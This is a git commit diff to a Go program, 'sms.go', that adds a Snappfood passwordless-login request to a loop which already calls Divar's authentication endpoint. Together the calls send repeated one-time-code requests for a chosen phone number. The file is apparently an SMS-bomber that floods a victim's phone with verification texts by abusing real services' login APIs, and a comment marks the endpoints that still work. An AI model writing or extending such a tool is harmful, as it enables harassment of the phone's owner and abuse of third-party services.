9aa3bbb3aa4a6f1054fb5695cbf06e0f71b5921e
monsmain <matinfarmani20@gmail.com>
2025-04-22 22:33:46 +0330

    Update sms.go

--- sms.go
+++ sms.go
@@ -107,6 +107,19 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
+		formData := url.Values{}
+		formData.Set("cellphone", phone)
+		requestBody := strings.NewReader(formData.Encode())
+		go func() {
+			resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
+			if err != nil {
+				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
+				ch <- http.StatusInternalServerError
+				return
+			}
+			defer resp.Body.Close()
+			ch <- resp.StatusCode
+		}() 
 		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
 			"phone": phone,
 		}, ch)  //active✅
